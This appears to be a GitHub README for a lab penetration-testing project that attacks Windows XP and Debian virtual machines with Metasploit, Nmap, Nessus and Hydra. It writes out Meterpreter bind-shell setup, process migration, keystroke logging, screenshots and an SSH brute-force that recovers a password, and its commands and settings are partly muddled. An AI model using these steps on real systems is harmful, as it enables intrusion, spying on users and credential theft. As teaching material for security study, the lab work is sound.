# Windows-and-Debian-Vulnerabilities-exploitation-with-metasploit
The project involved conducting targeted vulnerability assessments on both Windows and Debian systems, followed by exploiting identified vulnerabilities using the Metasploit Framework. Through systematic penetration testing, critical security weaknesses were identified and leveraged to simulate real-world cyber threats. This comprehensive approach enabled the team to gain valuable insights into system vulnerabilities and develop proactive defense strategies to mitigate potential risks. 

                 The tools required in this project are:-
                 
● Kali Linux - Kali Linux is Debian based, previously known as Backtrack, is a widely used Linux distribution used for penetration testing and security auditing,which has more than 600 pre-installed tools for "pen-testing, Computer forensics,Reverse Engineering, and security cookbook." Offensive Security develops it.Offensive Security also has offers the industry's most recognized certification for penetration testing, known as OSCP.

● MSFconsole - MSFconsole is by far the most popular part of the Metasploit Framework, and for good reason. It is one of the most flexible, feature-rich, and well supported tools within the Framework. MSFconsole provides a handy all-in-one interface to almost every option and setting available in the Framework; it’s like a
one-stop shop for all of your exploitation dreams. You can use MSFconsole to do everything, including launching an exploit, loading auxiliary modules, performing
enumeration, creating listeners, or running mass exploitation against an entire network.

● Metasploit - Metasploit is a pen-testing framework that is put in use to test security vulnerabilities, enumerate networks, and evade detection, just like all the phases of penetration testing combined, instead of using multiple tools. It is a single environment for penetration testing and exploits development. This tool is pre-installed in Kali Linux.

● Nmap - Nmap is a network scanner that looks for available target hosts via network discovery. It detects security risks by finding the systems in the network,their open ports, services running on those open ports, and scanning forvulnerabilities.

● Hydra - Hydra is a pre-built tool in kali used to crack passwords by brute-forceand attack different protocols.

● Nessus - Nessus is one of the most advanced and widely used vulnerability scanners. It scans the target for the vulnerabilities and provides detailed information such as CVE details and the vulnerability's risk factor and criticality.

●Payload - A payload is code that we want the system to execute and that is to be selected and delivered by the Framework. 

NESSUS INSTALLATION ON LINUX:

The downloadable installer can be found here for Linux-based systems. You need to make sure you know the distribution of Linux you are running in order to choose which installer to download. For instance, this article covers the Debian file system that Kali Linux is based on, so we will be downloading the *.deb installer file. We are also running a 64-bit version of Kali Linux; you’ll need to find out the architecture you are running. The latest version of Nessus is 8.0.0. Once the package file has been downloaded, you may install it from within the Linux terminal using the command below:

# sudo dpkg -i Nessus-10.5.3-debian6_i386.deb 

After installation on your Linux system, be sure to start up the Nessus daemon as shown below:

For Linux,use the command below:

# service nessusd start

For Debian/Kali and Ubuntu, use the command below:

# /etc/init.d/nessusd start

NESSUS VERSION CHECK:  When you launch a scan, Nessus goes through a series of steps.

Step 1: Nessus will retrieve the scan settings. The settings will define the ports to be scanned, the plugins to be enabled and policy preferences definitions.

Step 2: Nessus will then perform host discovery to determine the hosts that are up. The protocols used in host discovery will be ICMP, TCP, UDP and ARP. You can specify these per your desires.

Step 3: Nessus then performs a port scan of each host that is discovered to be up. You can also define which ports you will want scanned. Ports can be defined in ranges or individually, with valid ports ranging from 1 to 65535.

Step 4: Nessus will then perform service detection to determine the services that are running behind each port on each host discovered

Step 5: Nessus then performs operating system detection.

Step 6: Once all the steps are complete, Nessus runs each host against a database of known vulnerabilities in an attempt to discover which host contains which vulnerabilities

NMAP:-  Using Nmap we check for open ports in windows, for that we use following command: 

# nmap 192.168.80.131 (IP of Windows XP Professional)

Nmap operating system scan of victim machine: 

# nmap -O 192.168.80.131

# nmap -sT 192.168.80.131


METASPLOIT:   Using Bind TCP

We set payload as: Exploit/muti handler :-

 # LHOST (IP of Kali Linux Machine):192.168.80.131

 # LPORT 4444

 
Set payload windows/meterpreter/bind_tcp 

# Set LHOST 192.168.80.140


# Set RHOST 192.168.80.131

Check the ip of victim machine :192.168.80.131 

Rhost (IP of Windows) :192.168.80.131 

After exploiting bind tcp :-

  Goto Windows > Press Windows + R , then type cmd 
  
   # netstat  -anp tcp
   
  On Kali Linux:-
  
     Migrate (svhost.exe)832 to (explore.exe)1376 

ON WINDOWS :-  1st Activate the calculator at windows XP i.e. victim and then take its process id with help of command (tasklist) and then go to kali (meterpreter), Run command getpid and migrate it to stable process and kill the process with process id itself. 

Calci Killed:  

# meterpreter > kill process id 

Also, we can see what victim is typing by activating or starting keyscan_start 

 # meterpreter > keyscan_start

 Open notepad application on windows : Type Anything

 Then , See the actual results by typing keyscan_dump. All will show on attackers’ console. 

# meterpreter > keyscan_dump

and take the Screenshot:  

# meterpreter> screenshot 


HYDRA:-  

1st we have created user list and password list , having random password and user information also including real password and username (On Kali Linux):-

   # sudo nano username.txt 

   # sudo nano password.txt

   # sudo apt install Hydra  -y

   # Hydra -L username.txt -P password.txt ssh://192.168.80.131
    
  We got username as python and password is rootroot of Debian Machine (192.168.80.134) After that we tried for SSH port 

  # ssh python@192.168.80.134
